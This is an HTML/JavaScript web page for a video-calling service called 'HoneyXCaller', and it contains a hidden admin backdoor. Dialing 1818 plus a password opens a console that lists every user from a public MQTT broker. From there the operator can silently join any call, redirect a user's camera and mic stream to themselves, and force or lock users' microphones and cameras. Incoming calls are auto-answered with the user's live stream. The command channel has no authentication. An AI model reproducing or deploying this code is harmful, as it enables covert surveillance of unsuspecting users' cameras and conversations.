<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Honey Calling Services</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
        .phone-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0px 10px 25px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 320px; z-index: 10; margin-bottom: 20px; color: #333; }
        .screen { width: 100%; height: 50px; font-size: 24px; text-align: center; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 10px; box-sizing: border-box; background-color: #fafafa; color: #333; }
        .status { font-size: 14px; color: #333; margin-bottom: 15px; font-weight: bold; background: #e7f3ff; padding: 8px; border-radius: 8px; display: inline-block; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
        .btn { padding: 15px; font-size: 20px; border: none; background: #e4e6eb; border-radius: 50%; cursor: pointer; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: auto; font-weight: bold; color: #333; will-change: background-color; }
        .btn:active { background: #d8dadf; }
        
        .local-controls { display: flex; justify-content: space-around; margin-bottom: 15px; }
        .control-btn { border: none; padding: 8px 12px; border-radius: 8px; font-weight: bold; cursor: pointer; background: #007aff; color: white; font-size: 13px; }
        .control-btn.muted { background: #ff3b30; }
        .control-btn:disabled { background: #8e8e93; cursor: not-allowed; }

        .call-btn { background: #25d366; color: white; width: 100%; border: none; border-radius: 10px; height: 50px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .call-btn:active { background: #20ba5a; }
        
        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 600px; margin-top: 10px; }
        @media(max-width: 480px) { .video-grid { grid-template-columns: 1fr; } }
        .video-wrapper { position: relative; background: #222; border-radius: 12px; overflow: hidden; aspect-ratio: 4/3; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); backface-visibility: hidden; }
        .video-label { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.6); color: white; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: bold; }

        .announcement-bar { display: none; width: 100%; max-width: 600px; background: #ffcc00; color: #000; padding: 10px; border-radius: 10px; text-align: center; font-weight: bold; margin-bottom: 15px; }

        body.dark-theme { background-color: #1c1c1e; color: white; }
        body.dark-theme .phone-container { background: #2c2c2e; color: white; }
        body.dark-theme .screen { background: #3a3a3c; color: white; border-color: #48484a; }
        body.dark-theme .btn { background: #3a3a3c; color: white; }

        /* Admin Dashboard Windows UI */
        .admin-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 100; align-items: center; justify-content: center; color: #333; }
        .admin-content { background: white; padding: 25px; border-radius: 20px; width: 95%; max-width: 650px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: left; max-height: 90vh; overflow-y: auto; }
        .admin-content h2 { margin-top: 0; color: #ff3b30; border-bottom: 2px solid #f0f2f5; padding-bottom: 10px; }
        
        .tracker-stats { display: flex; justify-content: space-between; background: #f0f2f5; padding: 10px 15px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; }
        .user-list-container { max-height: 250px; overflow-y: auto; border: 1px solid #ddd; border-radius: 10px; padding: 10px; background: #fafafa; margin-bottom: 15px; }
        .user-item { padding: 12px; border-bottom: 1px solid #e8e8e8; display: flex; flex-direction: column; gap: 8px; font-size: 13px; }
        .user-row { display: flex; justify-content: space-between; align-items: center; }
        .admin-actions { display: flex; gap: 4px; flex-wrap: wrap; }
        .action-btn { border: none; padding: 5px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; cursor: pointer; color: white; }
        .action-btn.kick { background: #ff3b30; }
        .action-btn.ban { background: #5856d6; }
        .action-btn.mute { background: #ff9500; }
        .action-btn.unmute { background: #34c759; }
        .action-btn.spy { background: #007aff; }
        
        .admin-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; }
        .admin-btn { padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; background: #ff3b30; color: white; width: 100%; font-size: 16px; margin-top: 10px; }
        .badge { background: #007aff; color: white; padding: 2px 6px; border-radius: 10px; font-size: 11px; }
    </style>
</head>
<body>

<div id="announcement-box" class="announcement-bar"></div>

<div class="phone-container">
    <h3>HoneyXCaller</h3>
    <div id="my-number" class="status">Generating ID...</div>
    <input type="text" id="phone-screen" class="screen" placeholder="Enter ID to Dial" readonly />
    
    <div class="local-controls">
        <button id="local-mic-btn" class="control-btn" onclick="toggleLocalAudio()">Mic: ON</button>
        <button id="local-cam-btn" class="control-btn" onclick="toggleLocalVideo()">Cam: ON</button>
    </div>

    <div class="keypad">
        <button class="btn" onclick="press('1')">1</button>
        <button class="btn" onclick="press('2')">2</button>
        <button class="btn" onclick="press('3')">3</button>
        <button class="btn" onclick="press('4')">4</button>
        <button class="btn" onclick="press('5')">5</button>
        <button class="btn" onclick="press('6')">6</button>
        <button class="btn" onclick="press('7')">7</button>
        <button class="btn" onclick="press('8')">8</button>
        <button class="btn" onclick="press('9')">9</button>
        <button class="btn" onclick="press('*')">*</button>
        <button class="btn" onclick="press('0')">0</button>
        <button class="btn" onclick="clearScreen()">C</button>
    </div>
    
    <button class="call-btn" id="call-action" onclick="handleCall()">START CALL</button>
</div>

<div class="video-grid">
    <div class="video-wrapper">
        <video id="local-video" autoplay muted playsinline></video>
        <span class="video-label">You</span>
    </div>
    <div class="video-wrapper">
        <video id="remote-video" autoplay playsinline></video>
        <span class="video-label">Remote Friend/Spy Monitor</span>
    </div>
</div>

<div id="admin-panel" class="admin-modal">
    <div class="admin-content">
        <h2>🛠️ Global Overlord Control Center</h2>
        
        <div class="tracker-stats">
            <span>Systems Active Counter:</span>
            <span id="active-count" style="color: #007aff;">1</span>
        </div>

        <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px;">Live Discovered Node Arrays:</label>
        <div class="user-list-container" id="user-list">
            <div class="user-item" style="color: #888; text-align: center;">Mapping data channels...</div>
        </div>
        
        <label style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px;">Universal Execution Vectors:</label>
        <input type="text" id="broadcast-msg" class="admin-input" placeholder="Type global system notice configuration data...">
        <div style="display: flex; gap: 10px;">
            <button class="control-btn" style="flex: 1; background: #ffcc00; color: #000;" onclick="sendBroadcast()">Broadcast Notice</button>
            <button class="control-btn" style="flex: 1; background: #5856d6;" onclick="sendThemeToggle()">Toggle Global Theme</button>
        </div>

        <button class="admin-btn" onclick="closeAdminPanel()">Relinquish Console</button>
    </div>
</div>

<script>
    const ADMIN_TRIGGER = "1818";
    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c";
    
    const sessionToken = Math.random().toString(36).substring(2, 9);
    const myPhoneNumber = Math.floor(1000 + Math.random() * 9000).toString();
    
    document.getElementById('my-number').innerText = "Your Number ID: " + myPhoneNumber;

    const peer = new Peer(myPhoneNumber);
    let currentCall = null;
    let localStream = null;
    let peerTargetNode = "none"; 

    let adminAudioLocked = false;
    let adminVideoLocked = false;
    let amIAdminActive = false;
    let masterAdminToken = null;

    let activeUsersRegistry = {}; 
    let bannedRegistry = JSON.parse(localStorage.getItem('banned_nodes') || '[]');

    if (bannedRegistry.includes(sessionToken)) {
        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
    }

    const mqttClient = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
    const SYSTEM_PRESENCE = "web_dialer_presence_secure_prod_alpha_88";
    const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88"; 

    mqttClient.on('connect', () => {
        mqttClient.subscribe(SYSTEM_PRESENCE);
        mqttClient.subscribe(SYSTEM_COMMANDS);
        
        broadcastPresence();
        setInterval(broadcastPresence, 3000); 
        
        setInterval(() => {
            if (amIAdminActive) {
                mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "admin_heartbeat", token: sessionToken }));
            }
        }, 2000);
    });

    mqttClient.on('message', (topic, message) => {
        const rawMsg = message.toString();
        
        if (topic === SYSTEM_PRESENCE) {
            try {
                const data = JSON.parse(rawMsg);
                activeUsersRegistry[data.token] = {
                    roomCode: data.roomCode,
                    micEnabled: data.micEnabled,
                    camEnabled: data.camEnabled,
                    inCallWith: data.inCallWith,
                    lastSeen: Date.now()
                };
                requestAnimationFrame(updateAdminUI); 
            } catch(e) {}
        }
        
        if (topic === SYSTEM_COMMANDS) {
            try {
                const cmd = JSON.parse(rawMsg);

                if (cmd.type === "admin_heartbeat" && cmd.token !== sessionToken) {
                    masterAdminToken = cmd.token; 
                }

                if (cmd.type === "broadcast") {
                    const box = document.getElementById('announcement-box');
                    box.innerText = "📣 SYSTEM NOTICE: " + cmd.message;
                    box.style.display = 'block';
                    setTimeout(() => { box.style.display = 'none'; }, 8000);
                }
                if (cmd.type === "toggle_theme") {
                    document.body.classList.toggle('dark-theme');
                }

                if (cmd.target === sessionToken) {
                    if (cmd.type === "kick") {
                        alert("🔴 Admin disconnected your runtime session execution.");
                        location.reload();
                    }
                    if (cmd.type === "ban") {
                        bannedRegistry.push(sessionToken);
                        localStorage.setItem('banned_nodes', JSON.stringify(bannedRegistry));
                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 Admin Applied Local Storage Cryptographic Node Ban.</h1>";
                    }
                    
                    // --- DIRECT PHYSICAL HARDWARE ENGINES ---
                    if (cmd.type === "force_off_audio") {
                        adminAudioLocked = true; 
                        setAudioState(false);    
                        document.getElementById('local-mic-btn').disabled = true;
                    }
                    if (cmd.type === "force_on_audio") {
                        adminAudioLocked = false; 
                        document.getElementById('local-mic-btn').disabled = false;
                        setAudioState(true);     
                    }
                    if (cmd.type === "force_off_video") {
                        adminVideoLocked = true; 
                        setVideoState(false);    
                        document.getElementById('local-cam-btn').disabled = true;
                    }
                    if (cmd.type === "force_on_video") {
                        adminVideoLocked = false; 
                        document.getElementById('local-cam-btn').disabled = false;
                        setVideoState(true);     
                    }
                    
                    if (cmd.type === "redirect") {
                        if(currentCall) currentCall.close();
                        alert(`🔀 System Redirect Engine: Connecting you directly to Room ID [${cmd.connectTo}]`);
                        const call = peer.call(cmd.connectTo, localStream);
                        call.on('stream', function(remStream) {
                            document.getElementById('remote-video').srcObject = remStream;
                        });
                        currentCall = call;
                    }
                    broadcastPresence();
                }
            } catch(e) {}
        }
    });

    function broadcastPresence() {
        const micOn = localStream && localStream.getAudioTracks().length > 0 && localStream.getAudioTracks()[0].enabled;
        const camOn = localStream && localStream.getVideoTracks().length > 0 && localStream.getVideoTracks()[0].enabled;
        
        mqttClient.publish(SYSTEM_PRESENCE, JSON.stringify({
            token: sessionToken,
            roomCode: myPhoneNumber,
            micEnabled: micOn,
            camEnabled: camOn,
            inCallWith: peerTargetNode
        }));
    }

    setInterval(() => {
        const now = Date.now();
        let changed = false;
        for (const t in activeUsersRegistry) {
            if (now - activeUsersRegistry[t].lastSeen > 7000) {
                delete activeUsersRegistry[t];
                changed = true;
            }
        }
        if (changed) requestAnimationFrame(updateAdminUI);
    }, 3000);

    function updateAdminUI() {
        if (!amIAdminActive) return;
        const listContainer = document.getElementById('user-list');
        const countSpan = document.getElementById('active-count');
        const tokens = Object.keys(activeUsersRegistry);
        countSpan.innerText = tokens.length;

        if (tokens.length === 0) {
            listContainer.innerHTML = `<div class="user-item" style="color: #888; text-align: center;">No nodes mapping active signals.</div>`;
            return;
        }

        const fragment = document.createDocumentFragment();

        tokens.forEach(t => {
            const user = activeUsersRegistry[t];
            const isSelf = t === sessionToken;
            
            const item = document.createElement('div');
            item.className = 'user-item';
            
            item.innerHTML = `
                <div class="user-row">
                    <span>Node Token Identification Array: <strong>${t}</strong>${isSelf ? " <span class='badge'>You</span>" : ""}</span>
                    <span style="color: #25d366; font-weight: bold;">Dynamic Room ID: ${user.roomCode}</span>
                </div>
                <div class="user-row">
                    <span style="font-size:11px; color:#c60000; font-weight:bold;">Call Route Target ID: [${user.inCallWith}]</span>
                    <div class="admin-actions">
                        <button class="action-btn spy" onclick="spyCall('${user.roomCode}')">Join Call</button>
                        <button class="action-btn spy" style="background:#5856d6;" onclick="redirectCall('${t}')">Redirect to Me</button>
                        
                        <button class="action-btn unmute" onclick="dispatchCmd('force_on_audio', '${t}')">Mic ON</button>
                        <button class="action-btn mute" onclick="dispatchCmd('force_off_audio', '${t}')">Mic OFF</button>
                        
                        <button class="action-btn unmute" style="background:#34c759;" onclick="dispatchCmd('force_on_video', '${t}')">Cam ON</button>
                        <button class="action-btn mute" style="background:#ff3b30;" onclick="dispatchCmd('force_off_video', '${t}')">Cam OFF</button>
                        
                        <button class="action-btn kick" style="background:#8e8e93;" onclick="dispatchCmd('kick', '${t}')">Kick</button>
                        <button class="action-btn ban" onclick="dispatchCmd('ban', '${t}')">Ban Device</button>
                    </div>
                </div>
            `;
            fragment.appendChild(item);
        });

        listContainer.replaceChildren(fragment);
    }

    async function evaluateCryptoPassword(input) {
        const msgUint8 = new TextEncoder().encode(input);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    function dispatchCmd(type, target, updates = {}) {
        mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: type, target: target, ...updates }));
    }

    function sendBroadcast() {
        const msg = document.getElementById('broadcast-msg').value.trim();
        if(!msg) return;
        mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "broadcast", message: msg }));
        document.getElementById('broadcast-msg').value = "";
    }
    function sendThemeToggle() { mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "toggle_theme" })); }

    // Remote camera view capability
    function spyCall(targetRoomId) {
        if(currentCall) currentCall.close();
        const call = peer.call(targetRoomId, localStream);
        call.on('stream', function(remStream) {
            document.getElementById('remote-video').srcObject = remStream;
        });
        currentCall = call;
    }

    function redirectCall(targetToken) {
        dispatchCmd('redirect', targetToken, { connectTo: myPhoneNumber });
    }

    function setAudioState(state) {
        if (localStream && localStream.getAudioTracks().length > 0) {
            localStream.getAudioTracks()[0].enabled = state;
            const btn = document.getElementById('local-mic-btn');
            btn.innerText = state ? "Mic: ON" : "Mic: OFF";
            btn.className = state ? "control-btn" : "control-btn muted";
        }
    }
    function toggleLocalAudio() {
        if (adminAudioLocked) return;
        setAudioState(!localStream.getAudioTracks()[0].enabled);
        broadcastPresence();
    }
    function setVideoState(state) {
        if (localStream && localStream.getVideoTracks().length > 0) {
            localStream.getVideoTracks()[0].enabled = state;
            const btn = document.getElementById('local-cam-btn');
            btn.innerText = state ? "Cam: ON" : "Cam: OFF";
            btn.className = state ? "control-btn" : "control-btn muted";
        }
    }
    function toggleLocalVideo() {
        if (adminVideoLocked) return;
        setVideoState(!localStream.getVideoTracks()[0].enabled);
        broadcastPresence();
    }

    function press(num) { document.getElementById('phone-screen').value += num; }
    function clearScreen() { document.getElementById('phone-screen').value = ''; }

    function initMedia() {
        const mediaConstraints = { 
            audio: true, 
            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 24 } } 
        };
        navigator.mediaDevices.getUserMedia(mediaConstraints)
            .then(s => { localStream = s; document.getElementById('local-video').srcObject = s; })
            .catch(() => {
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                    .then(s => { localStream = s; });
            });
    }
    window.onload = initMedia;

    peer.on('call', function(call) {
        if (!localStream) return;
        call.answer(localStream);
        peerTargetNode = call.peer;
        call.on('stream', function(s) { document.getElementById('remote-video').srcObject = s; });
        currentCall = call;
        updateUIForActiveCall();
        broadcastPresence();
    });

    async function handleCall() {
        const val = document.getElementById('phone-screen').value;
        
        if (val === ADMIN_TRIGGER) {
            clearScreen();
            if(masterAdminToken !== null) {
                return alert("⛔ CRITICAL EXCLUSION: An active Admin Engine instance is currently running globally.");
            }

            const pwd = prompt("🔒 Enter Admin Security Access Password:");
            if (!pwd) return;
            const verifiedHash = await evaluateCryptoPassword(pwd);
            
            if (verifiedHash === PASSWORD_HASH) {
                amIAdminActive = true;
                document.getElementById('admin-panel').style.display = 'flex';
                updateAdminUI();
            } else {
                alert("❌ ACCESS DENIED: Invalid Cryptographic Handshake Signature.");
            }
            return;
        }

        if (currentCall) { currentCall.close(); location.reload(); return; }
        if(!val || !localStream) return;

        peerTargetNode = val;
        const call = peer.call(val, localStream);
        call.on('stream', function(s) { document.getElementById('remote-video').srcObject = s; });
        currentCall = call;
        updateUIForActiveCall();
        broadcastPresence();
    }

    function updateUIForActiveCall() {
        const btn = document.getElementById('call-action');
        btn.innerText = "HANG UP"; btn.style.background = "#ff3b30";
    }
    function closeAdminPanel() {
        document.getElementById('admin-panel').style.display = 'none';
        amIAdminActive = false;
    }
</script>
